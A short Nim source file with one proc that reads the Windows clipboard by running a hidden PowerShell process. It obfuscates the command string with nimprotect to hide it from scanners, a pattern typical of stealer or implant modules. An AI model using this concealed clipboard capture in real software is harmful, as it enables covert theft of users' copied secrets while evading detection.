import osproc
import nimprotect

proc get_clipboard*(): string =
  var clipboard = execProcess(protectString("powershell.exe /c Get-Clipboard"), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
  return clipboard
